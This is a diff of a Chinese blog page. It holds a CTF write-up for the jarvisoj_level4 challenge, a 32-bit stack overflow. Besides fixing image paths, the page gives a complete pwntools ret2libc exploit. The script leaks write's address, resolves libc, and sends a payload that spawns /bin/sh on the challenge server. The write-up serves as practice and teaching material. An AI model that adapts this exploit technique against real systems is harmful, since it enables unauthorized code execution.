@@ -23,16 +23,16 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="jarvisoj_level4  拿到题目，先checksec一下：  没有栈保护，可能是栈溢出，IDA里面看看：  看来确实是，仔细算算，如果我们利用write函数泄露地址，给的0x100字节大小刚好让我们溢出并再次返回到main函数，打断点到上图函数快要结束的位置(0x804846E leave)，去确认buf的大小IDA给的对不对：   既然没问题，那就上脚本： 12345678910111">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/.com//1.png">
-<meta property="og:image" content="http://example.com/.com//2.png">
-<meta property="og:image" content="http://example.com/.com//6.png">
-<meta property="og:image" content="http://example.com/.com//5.png">
+<meta property="og:image" content="http://example.com/2024/05/27/jarvisoj-level4/1.png">
+<meta property="og:image" content="http://example.com/2024/05/27/jarvisoj-level4/2.png">
+<meta property="og:image" content="http://example.com/2024/05/27/jarvisoj-level4/6.png">
+<meta property="og:image" content="http://example.com/2024/05/27/jarvisoj-level4/5.png">
 <meta property="article:published_time" content="2024-05-27T08:42:49.000Z">
 <meta property="article:modified_time" content="2024-05-27T08:55:39.159Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/.com//1.png">
+<meta name="twitter:image" content="http://example.com/2024/05/27/jarvisoj-level4/1.png">
   
   
   
@@ -281,12 +281,12 @@
                 <h1 align="center">jarvisoj_level4</h1>
 
 <p>拿到题目，先checksec一下：</p>
-<p><img src="/.com//1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2024/05/27/jarvisoj-level4/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>没有栈保护，可能是栈溢出，IDA里面看看：</p>
-<p><img src="/.com//2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><img src="/2024/05/27/jarvisoj-level4/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>看来确实是，仔细算算，如果我们利用write函数泄露地址，给的0x100字节大小刚好让我们溢出并再次返回到main函数，打断点到上图函数快要结束的位置(0x804846E leave)，去确认buf的大小IDA给的对不对：</p>
-<p><img src="/.com//6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
-<p><img src="/.com//5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<p><img src="/2024/05/27/jarvisoj-level4/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<p><img src="/2024/05/27/jarvisoj-level4/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>既然没问题，那就上脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#sh = process(&quot;./pwn&quot;)</span><br><br>sh=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29462</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br><br><br>write_plt_address = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>write_got_address = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>main_address = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(write_plt_address) + p32(main_address) + p32(<span class="hljs-number">1</span>) + p32(write_got_address) + p32(<span class="hljs-number">0x6</span>) <br><br>sh.sendline(payload)<br><br>write_address = u32(sh.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_address))<br><br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write_address)<br><br>libc_base = write_address -libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br><br>system_address = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br><br>bin_sh_address = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br><br>payload = <span class="hljs-string">&quot;A&quot;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(system_address) + <span class="hljs-string">&quot;AAAA&quot;</span> + p32(bin_sh_address)<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
